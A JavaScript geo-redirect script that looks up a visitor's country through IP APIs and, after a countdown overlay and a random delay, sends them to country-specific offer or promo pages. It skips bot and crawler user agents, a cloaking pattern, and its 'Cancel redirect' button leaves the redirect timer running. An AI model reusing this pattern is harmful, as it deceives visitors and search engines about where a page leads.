// assets/js/geo-redirect.js
const CONFIG = {
  cookieName: "geo_redirected",
  cookieExpiryDays: 1,
  minDelay: 10000, // 10 segundos
  maxDelay: 40000, // 40 segundos
  countdownDuration: 15,
  geoApiUrls: [
    'https://ipapi.co/json/',
    'https://ip-api.com/json/?fields=countryCode',
    'https://api.ipdata.co?api-key=SEU_API_KEY'
  ],
  countryMapping: {
    'BR': ['/geo/br/main.html', '/geo/br/home.html'],
    'IN': ['/geo/in/offer.html', '/geo/in/welcome.html'],
    'RU': ['/geo/ru/promo.html', '/geo/ru/index.html'],
    'default': ['/geo/global/default.html']
  },
  excludedPaths: ['/geo/', 'about.html', 'privacy-policy.html']
};

// Cria o overlay de redirecionamento
function createOverlay() {
  const overlay = document.createElement('div');
  overlay.id = 'geo-redirect-overlay';
  overlay.innerHTML = `
    <div class="geo-content">
      <h2>Loading best content for your region...</h2>
      <p>You will be redirected in <span id="geo-countdown">${CONFIG.countdownDuration}</span> seconds</p>
      <div class="geo-spinner"></div>
      <button id="geo-cancel-btn" class="geo-btn">Cancel redirect</button>
    </div>
  `;
  return overlay;
}

function shouldRedirect() {
  if (CONFIG.excludedPaths.some(path => window.location.pathname.includes(path))) {
    return false;
  }
  
  if (document.cookie.includes(`${CONFIG.cookieName}=true`)) {
    return false;
  }
  
  const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
  return !isBot;
}

function showCountdown() {
  const overlay = createOverlay();
  document.body.appendChild(overlay);
  let seconds = CONFIG.countdownDuration;
  
  const countdown = setInterval(() => {
    seconds--;
    document.getElementById('geo-countdown').textContent = seconds;
    
    if (seconds <= 0) clearInterval(countdown);
  }, 1000);
  
  document.getElementById('geo-cancel-btn').addEventListener('click', () => {
    clearInterval(countdown);
    document.body.removeChild(overlay);
    setRedirectCookie();
  });
}

function setRedirectCookie() {
  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + CONFIG.cookieExpiryDays);
  document.cookie = `${CONFIG.cookieName}=true; expires=${expiryDate.toUTCString()}; path=/`;
}

async function getCountryCode() {
  const errors = [];
  for (const apiUrl of CONFIG.geoApiUrls) {
    try {
      const response = await fetch(apiUrl);
      const data = await response.json();
      if (data.country || data.countryCode) {
        return data.country || data.countryCode;
      }
    } catch (error) {
      errors.push(error);
    }
  }
  throw new Error('All APIs failed: ' + errors.join(', '));
}

function getRandomDelay() {
  return Math.floor(Math.random() * (CONFIG.maxDelay - CONFIG.minDelay)) + CONFIG.minDelay;
}

async function redirectByCountry() {
  if (!shouldRedirect()) return;
  
  showCountdown();
  setRedirectCookie();
  
  try {
    const countryCode = await getCountryCode();
    const targetUrls = CONFIG.countryMapping[countryCode] || CONFIG.countryMapping['default'];
    const randomUrl = targetUrls[Math.floor(Math.random() * targetUrls.length)];
    const delay = getRandomDelay();
    
    setTimeout(() => {
      window.location.href = randomUrl;
    }, delay);
  } catch (error) {
    setTimeout(() => {
      window.location.href = CONFIG.countryMapping['default'][0];
    }, CONFIG.minDelay);
  }
}

// Inicia
document.addEventListener('DOMContentLoaded', redirectByCountry);
